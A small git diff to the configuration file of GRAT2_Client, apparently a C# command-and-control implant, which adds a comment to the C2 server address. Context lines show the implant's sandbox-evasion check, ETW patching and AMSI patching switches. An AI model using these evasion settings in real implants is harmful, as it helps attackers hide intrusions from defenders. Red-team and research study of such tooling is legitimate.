@@ -6,7 +6,7 @@ namespace GRAT2_Client.PInvoke
 {
     class Config
     {
-        public static string c2 = "http://10.0.0.1/";
+        public static string c2 = "http://10.0.0.1/"; // Your GRAT2 Server IP Address (Required)
         public static bool sandboxEvasion = SandBoxFunc(0); // If enabled (1), GRAT2 will be executed only on a domain join computer otherwise, GRAT2 will be terminated. If disabled (0), GRAT2 will be executed only on a non domain join computer otherwise, will be terminated.
         public static int patchEtw = EtwFunc(1); // Enable (1) or Disable (0) Etw Patching
         public static int patchAmsi = AmsiFunc(1); // Enable (1) or Disable (0) .NET AMSI Patching
